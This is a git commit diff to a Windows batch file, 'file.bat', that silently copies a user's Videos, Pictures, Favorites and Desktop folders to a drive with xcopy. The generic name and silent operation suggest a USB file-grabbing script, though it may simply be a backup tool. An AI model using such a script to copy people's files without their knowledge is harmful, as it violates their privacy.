1a3990afcebcbb98221ca91d7ff21f58923efc33
Chai <83523587+CPScript@users.noreply.github.com>
2023-02-09 16:49:25 -0500

    Update file.bat

--- file.bat
+++ file.bat
@@ -4,10 +4,8 @@
 SET odrive=%odrive:~0,2%
 set backupcmd=xcopy /s /c /d /e /h /i /r /y
 echo off
-%backupcmd% "%USERPROFILE%\videos" "%drive%\all\Captures"
-%backupcmd% "%USERPROFILE%\videos" "%drive%\all\Videos"
-%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\Screenshots"
-%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\videos" "%drive%\all\"
+%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\"
 %backupcmd% "%USERPROFILE%\pictures" "%drive%\all\Saved Pictures"
 %backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
 %backupcmd% "%USERPROFILE%\Desktop" "%drive%\all\Desktop"
